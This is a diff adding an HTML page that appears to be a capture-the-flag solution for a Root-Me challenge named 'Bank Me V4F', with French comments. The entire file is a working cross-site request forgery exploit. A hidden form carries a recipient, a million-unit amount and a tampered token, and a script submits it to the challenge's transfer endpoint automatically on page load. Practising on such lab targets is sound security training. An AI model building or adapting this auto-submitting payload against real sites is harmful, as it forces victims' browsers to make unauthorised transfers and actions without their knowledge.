@@ -1,1 +1,20 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Me V4F</title>
+</head>
+<body>
+    <h1>Transfert de fonds CSRF</h1>
+    <form id="csrfForm" action="https://bankme-4.challenges.pro.root-me.org/transfer/" method="POST">
+        <input type="hidden" name="recipient" value="admin"> <!-- Le destinataire est admin -->
+        <input type="hidden" name="amount" value="1000000"> <!-- Montant de ? -->
+        <input type="hidden" name="token" value="677cf7a65ea259bb000000"> <!-- Votre token modifié -->
+    </form>
+    <script>
+        // Soumettre automatiquement le formulaire lorsqu'un utilisateur accède à la page
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
